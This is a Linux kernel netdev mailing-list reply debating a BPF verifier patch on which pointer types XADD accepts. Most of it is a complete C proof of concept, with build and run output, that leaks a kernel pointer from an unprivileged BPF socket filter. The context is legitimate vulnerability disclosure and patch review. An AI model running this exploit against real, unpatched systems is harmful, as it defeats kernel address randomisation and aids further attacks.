Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id F21BF1AD2E4
	for <lists+netdev@lfdr.de>; Fri, 17 Apr 2020 00:35:16 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1729276AbgDPWfO (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Thu, 16 Apr 2020 18:35:14 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56498 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1729174AbgDPWfL (ORCPT
        <rfc822;netdev@vger.kernel.org>); Thu, 16 Apr 2020 18:35:11 -0400
Received: from mail-lj1-x241.google.com (mail-lj1-x241.google.com [IPv6:2a00:1450:4864:20::241])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 8B3F6C061A0C
        for <netdev@vger.kernel.org>; Thu, 16 Apr 2020 15:35:11 -0700 (PDT)
Received: by mail-lj1-x241.google.com with SMTP id r7so85813ljg.13
        for <netdev@vger.kernel.org>; Thu, 16 Apr 2020 15:35:11 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=S+GCpyaVXqR7qEkJijKnO8QHlcr8iTMsAE1S+43Kxig=;
        b=Rmq1mh4Lw9bMmSRj4f4oUS8eC4fsW+UQwTMa2krntlt3nFDdRseM/JeoRDU/YPvgcf
         cG684/eOJ8gtmyw6o2OjD4KzPqNWJ7UOTy40y4mdg0ghvusyuAZlPDxCpWUG5RUlrQM8
         TjCQp/1WshBItK8yUn/S1Glamy22lNamkqNatuAsCxdqAHSQy5b8ckTLTzfzzIuF/Yuu
         zHBha+497p9AZGeU9ZP4wdSnxOiOl1Uigqq7OxtT7gt7D5QNR3YX69HmCPdeULClozIK
         Vl03fopoNLRHuQVveuS6TqDDUHKiKhtxTacrc0c0ngmZAyodfCPANmRpMXITOVaPyZpe
         10bQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=S+GCpyaVXqR7qEkJijKnO8QHlcr8iTMsAE1S+43Kxig=;
        b=ua1pXM0hTrRs0VPs229/ZJ3mr+URzpnLZtfA+14Lza5IIjl+vvViJlACHN7qc6aRR8
         1Z72O/rY/Q6Kfz4GansFwtoZvzfsO3r0MlvPuzBrkadorbkyH35O4qO6c/+k5Ew22rod
         h99PUVsn5osIEDVh/tuCZLgGntVH6ClHV4p/6JrdxiDBIWV+tquZueIR9cjj6bDyJAiQ
         4ncdHXThqB1kH53IjlcDLulrK7G4pA0DS0wO5aGH5PQWGckLy2OGJrEufbxAUTx9A5rm
         q1Gs70BFljOkhV0Y6TfnDyBRuLgbNQVqW8GX9jvzdobj/qQW0fBWFW58mGPWbtlbXF8C
         Rahw==
X-Gm-Message-State: AGi0PuYrxdqFkxA0hV8vwr52BbIo5yJC1Y/jIe8/Z8/3yxGC3TDer/GP
        W38XlbuFKaYFTVUa1mxRVqjxGpoEvm707j6kldIJvA==
X-Google-Smtp-Source: APiQypIKsCyb6VsVxGBCRSzo3rYbVtZ7BCEINLyC0RulQiGN41zuncouyuqIaoka89VwNxz01QWQ1W+rsTWgQrd9lA4=
X-Received: by 2002:a2e:b17a:: with SMTP id a26mr183777ljm.215.1587076509643;
 Thu, 16 Apr 2020 15:35:09 -0700 (PDT)
MIME-Version: 1.0
References: <20200415204743.206086-1-jannh@google.com> <20200416211116.qxqcza5vo2ddnkdq@ast-mbp.dhcp.thefacebook.com>
In-Reply-To: <20200416211116.qxqcza5vo2ddnkdq@ast-mbp.dhcp.thefacebook.com>
From:   Jann Horn <jannh@google.com>
Date:   Fri, 17 Apr 2020 00:34:42 +0200
Message-ID: <CAG48ez0ZaSo-fC0bXnYChAmEZvv_0sGsxUG5HdFn6YJdOf1=Mg@mail.gmail.com>
Subject: Re: [PATCH bpf] bpf: Use pointer type whitelist for XADD
To:     Alexei Starovoitov <alexei.starovoitov@gmail.com>
Cc:     bpf <bpf@vger.kernel.org>, Alexei Starovoitov <ast@kernel.org>,
        Daniel Borkmann <daniel@iogearbox.net>,
        Martin KaFai Lau <kafai@fb.com>,
        Song Liu <songliubraving@fb.com>, Yonghong Song <yhs@fb.com>,
        Andrii Nakryiko <andriin@fb.com>,
        John Fastabend <john.fastabend@gmail.com>,
        KP Singh <kpsingh@chromium.org>,
        Network Development <netdev@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

On Thu, Apr 16, 2020 at 11:11 PM Alexei Starovoitov
<alexei.starovoitov@gmail.com> wrote:
> On Wed, Apr 15, 2020 at 10:47:43PM +0200, Jann Horn wrote:
> > At the moment, check_xadd() uses a blacklist to decide whether a given
> > pointer type should be usable with the XADD instruction. Out of all the
> > pointer types that check_mem_access() accepts, only four are currently let
> > through by check_xadd():
> >
> > PTR_TO_MAP_VALUE
> > PTR_TO_CTX           rejected
> > PTR_TO_STACK
> > PTR_TO_PACKET        rejected
> > PTR_TO_PACKET_META   rejected
> > PTR_TO_FLOW_KEYS     rejected
> > PTR_TO_SOCKET        rejected
> > PTR_TO_SOCK_COMMON   rejected
> > PTR_TO_TCP_SOCK      rejected
> > PTR_TO_XDP_SOCK      rejected
> > PTR_TO_TP_BUFFER
> > PTR_TO_BTF_ID
> >
> > Looking at the currently permitted ones:
> >
> >  - PTR_TO_MAP_VALUE: This makes sense and is the primary usecase for XADD.
> >  - PTR_TO_STACK: This doesn't make much sense, there is no concurrency on
> >    the BPF stack. It also causes confusion further down, because the first
> >    check_mem_access() won't check whether the stack slot being read from is
> >    STACK_SPILL and the second check_mem_access() assumes in
> >    check_stack_write() that the value being written is a normal scalar.
> >    This means that unprivileged users can leak kernel pointers.
> >  - PTR_TO_TP_BUFFER: This is a local output buffer without concurrency.
> >  - PTR_TO_BTF_ID: This is read-only, XADD can't work. When the verifier
> >    tries to verify XADD on such memory, the first check_ptr_to_btf_access()
> >    invocation gets confused by value_regno not being a valid array index
> >    and writes to out-of-bounds memory.
>
> > Limit XADD to PTR_TO_MAP_VALUE, since everything else at least doesn't make
> > sense, and is sometimes broken on top of that.
> >
> > Fixes: 17a5267067f3 ("bpf: verifier (add verifier core)")
> > Signed-off-by: Jann Horn <jannh@google.com>
> > ---
> > I'm just sending this on the public list, since the worst-case impact for
> > non-root users is leaking kernel pointers to userspace. In a context where
> > you can reach BPF (no sandboxing), I don't think that kernel ASLR is very
> > effective at the moment anyway.
> >
> > This breaks ten unit tests that assume that XADD is possible on the stack,
> > and I'm not sure how all of them should be fixed up; I'd appreciate it if
> > someone else could figure out how to fix them. I think some of them might
> > be using XADD to cast pointers to numbers, or something like that? But I'm
> > not sure.
> >
> > Or is XADD on the stack actually something you want to support for some
> > reason, meaning that that part would have to be fixed differently?
>
> yeah. 'doesnt make sense' is relative.
> I prefer to fix the issues instead of disabling them.
> xadd to PTR_TO_STACK, PTR_TO_TP_BUFFER, PTR_TO_BTF_ID should all work
> because they are direct pointers to objects.

PTR_TO_STACK and PTR_TO_TP_BUFFER I can sort of understand. But
PTR_TO_BTF_ID is always readonly, so XADD on PTR_TO_BTF_ID really
doesn't make any sense AFAICS.

> Unlike pointer to ctx and flow_key that will be rewritten and are not
> direct pointers.
>
> Short term I think it's fine to disable PTR_TO_TP_BUFFER because
> prog breakage is unlikely (if it's actually broken which I'm not sure yet).
> But PTR_TO_BTF_ID and PTR_TO_STACK should be fixed.
> The former could be used in bpf-tcp-cc progs. I don't think it is now,
> but it's certainly conceivable.
> PTR_TO_STACK should continue to work because tests are using it.
> 'but stack has no concurrency' is not an excuse to break tests.

Meh, if you insist, I guess I can patch it differently. Although I
really think that "tests abuse it as a hack" shouldn't be a reason to
keep around functionality that doesn't make sense for production use.

> Also I don't understand why you're saying that PTR_TO_STACK xadd is leaking.
> The first check_mem_access() will check for STACK_SPILL afaics.

Nope. check_stack_read() checks for STACK_SPILL, but it doesn't do
anything special with that information.

user@vm:~/test/bpf-xadd-pointer-leak$ cat bpf-pointer-leak.c
#define _GNU_SOURCE
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/socket.h>
#include <string.h>
#include <poll.h>
#include <sys/uio.h>
#include <fcntl.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))


/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

unsigned long get_ulong(int map_fd, uint64_t idx) {
  uint64_t value;
  union bpf_attr lookup_map_attrs = {
    .map_fd = map_fd,
    .key = (uint64_t)&idx,
    .value = (uint64_t)&value
  };
  if (bpf_(BPF_MAP_LOOKUP_ELEM, &lookup_map_attrs))
    err(1, "MAP_LOOKUP_ELEM");
  return value;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 2,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  printf("==========================\n%s==========================\n",
verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

int main(void) {
  int small_map = array_create(8, 1);
  struct bpf_insn insns[] = {
    // r7 = map_pointer
    BPF_LD_MAP_FD(BPF_REG_7, small_map),
    // r8 = launder(map_pointer)
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_7, -8),
    BPF_MOV64_IMM(BPF_REG_1, 0),
    ((struct bpf_insn) {
      .code  = BPF_STX | BPF_DW | BPF_XADD,
      .dst_reg = BPF_REG_FP,
      .src_reg = BPF_REG_1,
      .off = -8
    }),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_FP, -8),

    // store r8 into map
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  int sock_fd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  trigger_proc(sock_fd);
  printf("map[0] = 0x%lx\n", get_ulong(small_map, 0));
}
user@vm:~/test/bpf-xadd-pointer-leak$ gcc -o bpf-pointer-leak bpf-pointer-leak.c
user@vm:~/test/bpf-xadd-pointer-leak$ ./bpf-pointer-leak
==========================
func#0 @0
0: R1=ctx(id=0,off=0,imm=0) R10=fp0
0: (18) r7 = 0x0
2: R1=ctx(id=0,off=0,imm=0) R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0
2: (7b) *(u64 *)(r10 -8) = r7
3: R1=ctx(id=0,off=0,imm=0) R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
R10=fp0 fp-8_w=map_ptr
3: (b7) r1 = 0
4: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8_w=map_ptr
4: (db) lock *(u64 *)(r10 -8) += r1
5: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8_w=mmmmmmmm
5: (79) r8 = *(u64 *)(r10 -8)
6: R1_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0)
R10=fp0 fp-8_w=mmmmmmmm
6: (bf) r1 = r7
7: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
fp-8_w=mmmmmmmm
7: (bf) r2 = r10
8: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp0
R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
fp-8_w=mmmmmmmm
8: (07) r2 += -4
9: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp-4
R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
fp-8_w=mmmmmmmm
9: (62) *(u32 *)(r2 +0) = 0
10: R1_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R2_w=fp-4
R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
fp-8_w=mmmmmmmm
10: (85) call bpf_map_lookup_elem#1
11: R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)
R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0) R10=fp0
fp-8_w=mmmmmmmm
11: (55) if r0 != 0x0 goto pc+1
 R0_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8_w=invP(id=0)
R10=fp0 fp-8_w=mmmmmmmm
12: R0_w=invP0 R7_w=map_ptr(id=0,off=0,ks=4,vs=8,imm=0)
R8_w=invP(id=0) R10=fp0 fp-8_w=mmmmmmmm
12: (95) exit
13: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
fp-8=mmmmmmmm
13: (7b) *(u64 *)(r0 +0) = r8
 R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
fp-8=mmmmmmmm
14: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)
R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0) R10=fp0
fp-8=mmmmmmmm
14: (b7) r0 = 0
15: R0_w=invP0 R7=map_ptr(id=0,off=0,ks=4,vs=8,imm=0) R8=invP(id=0)
R10=fp0 fp-8=mmmmmmmm
15: (95) exit
processed 15 insns (limit 1000000) max_states_per_insn 0 total_states
1 peak_states 1 mark_read 1
==========================
map[0] = 0xffff888067ffa800
user@vm:~/test/bpf-xadd-pointer-leak$
